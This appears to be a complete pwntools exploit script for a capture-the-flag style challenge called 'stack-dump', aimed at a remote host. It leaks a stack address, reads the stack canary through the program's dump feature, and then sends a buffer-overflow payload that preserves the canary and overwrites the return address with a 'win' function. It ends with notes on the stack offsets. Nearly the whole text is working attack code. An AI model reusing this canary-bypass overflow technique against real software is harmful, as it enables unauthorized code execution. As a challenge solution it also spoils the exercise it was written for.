from pwn import *

p = remote('plsdonthaq.me', 2004)
#p = process('./stack-dump')

p.recvuntil('pointer ')
canary_addr = p32(int(p.recvline().rstrip(), 16) + 0x71 - 0x8)
p.recvlines(4)
p.sendline('a')
p.recvuntil('len: ')
p.sendline('4')
p.sendline(canary_addr)
p.recvlines(10)
p.sendline('b')
p.recvuntil(': ')
canary_val = p.recvline().rstrip()[:4]
padding = b'A'*96
padding2 = b'A'*8
win_addr = p32(0x080486c6)
payload = padding + canary_val + padding2 + win_addr
p.recvlines(4)
p.sendline('a')
p.recvuntil('len: ')
p.sendline(str(len(payload)))
p.sendline(payload)
p.recvlines(10)
p.sendline('d')
p.interactive()

'''
[ebp-0x68] contains address that is dumped, input for length and the input data
ebp - 0x71 gets printed at the beginning
ebp-0x8 contains stack canary value

a)
len :4
value

'''
